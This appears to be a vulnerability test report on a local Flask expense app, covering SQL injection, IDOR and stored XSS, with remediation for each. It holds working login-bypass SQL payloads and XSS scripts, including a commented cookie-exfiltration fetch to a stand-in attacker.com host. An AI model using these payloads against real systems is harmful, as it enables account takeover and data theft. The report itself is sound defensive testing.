# Vulnerability Documentation

## SQL Injection in Login Form

### Vulnerability Description
The login route uses string formatting to build SQL queries, allowing attackers to inject malicious SQL code.

### Location
File: `app.py`
Function: `login()`
Line: `query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"`

### Proof of Concept

#### Attack 1: Authentication Bypass with OR
**Payload:**
- Username: `testuser`
- Password: `' OR '1'='1`

**Result:** Successfully logged in without valid password

**Malicious Query:**
```sql
SELECT * FROM users WHERE username = 'testuser' AND password = '' OR '1'='1'
```

#### Attack 2: Comment-based Bypass
**Payload:**
- Username: `testuser'--`
- Password: (any value)

**Result:** Password check completely bypassed

**Malicious Query:**
```sql
SELECT * FROM users WHERE username = 'testuser'--' AND password = 'anything'
```

### Impact
- **Severity:** CRITICAL
- Attackers can bypass authentication
- Access any user account
- Potential for data theft
- Potential for data manipulation

### Root Cause
Using Python f-strings to concatenate user input directly into SQL queries without sanitization or parameterization.

### Remediation
Use parameterized queries (prepared statements):
```python
cursor.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password))
```

---

## IDOR (Insecure Direct Object Reference)

### Vulnerability Description
The `/expense/<id>` route does not verify that the requested expense belongs to the authenticated user, allowing any logged-in user to view any expense by manipulating the URL parameter.

### Location
File: `app.py`
Function: `view_expense(expense_id)`
Line: `expense = conn.execute("SELECT * FROM expenses WHERE id = ?", (expense_id,))`

### Proof of Concept

#### Setup
1. Create two users: `testuser` and `attacker`
2. Each user creates expenses
3. Login as `attacker`

#### Attack Steps
1. Navigate to `/expense/1` (an expense created by `testuser`)
2. Successfully view the expense despite not being the owner
3. Can iterate through all IDs to enumerate all users' expenses

#### Evidence
- Attacker (user_id=2) viewing expense belonging to testuser (user_id=1)
- URL: `http://127.0.0.1:5000/expense/1`
- Response shows: `user_id: 1` (not the attacker's ID)

### Impact
- **Severity:** HIGH
- Complete breach of user privacy
- Attackers can enumerate all expenses in the database
- Can gather financial information about other users
- Violates data confidentiality

### Root Cause
Missing authorization check - the application verifies authentication (user is logged in) but not authorization (user owns this resource).

### Remediation
Add ownership verification:

```python
expense = conn.execute(
    "SELECT * FROM expenses WHERE id = ? AND user_id = ?",
    (expense_id, session['user_id'])
).fetchone()
```

---

## Stored XSS (Cross-Site Scripting)

### Vulnerability Description
The expense description field does not sanitize user input, and the view template uses the `| safe` filter, allowing attackers to inject malicious JavaScript that executes in victims' browsers.

### Location
File: `app.py` (storage)
Function: `add_expense()`

File: `templates/view_expense.html` (execution)
Line: `{{ expense.description | safe }}`

### Proof of Concept

#### Attack 1: Basic XSS Alert
**Payload:**
```html
<script>alert('XSS Vulnerability!')</script>
```

**Steps:**
1. Add expense with payload as description
2. View the expense
3. JavaScript executes, showing alert popup

#### Attack 2: Cookie Theft (Session Hijacking)
**Payload:**
```html
<script>
var cookie = document.cookie;
alert('Stolen cookie: ' + cookie);
// In real attack: send to attacker's server
// fetch('https://attacker.com/steal?cookie=' + cookie)
</script>
```

**Impact:** Attacker can steal session cookies and hijack user accounts

#### Attack 3: Page Defacement
**Payload:**
```html
<h1 style="color:red;">HACKED!</h1>
<script>document.body.innerHTML='<h1>All your data belongs to us</h1>'</script>
```

**Impact:** Complete control over page appearance and functionality

### Impact
- **Severity:** HIGH
- Session hijacking (account takeover)
- Credential theft
- Malicious redirects
- Page defacement
- Keylogging possible
- Affects all users who view the malicious expense

### Attack Vector
**Stored XSS** - the malicious code is permanently stored in the database, affecting all users who view it (not just the attacker).

### Root Cause
1. No input sanitization in `add_expense()`
2. Use of `| safe` filter in template
3. No Content Security Policy (CSP)

### Remediation
1. **Remove `| safe` filter** - let Flask auto-escape HTML
2. **Sanitize input** - use a library like Bleach
3. **Implement CSP headers** - prevent inline scripts
4. **Validate input** - restrict allowed characters

**Secure code:**
```python
# In add_expense()
from markupsafe import escape
description = escape(request.form['description'])
```
```html
<!-- In view_expense.html - remove | safe -->
<td>{{ expense.description }}</td>
```

---


**Tested by:** Mugeha Jackline(Jackie) 
**Date:** February 6, 2026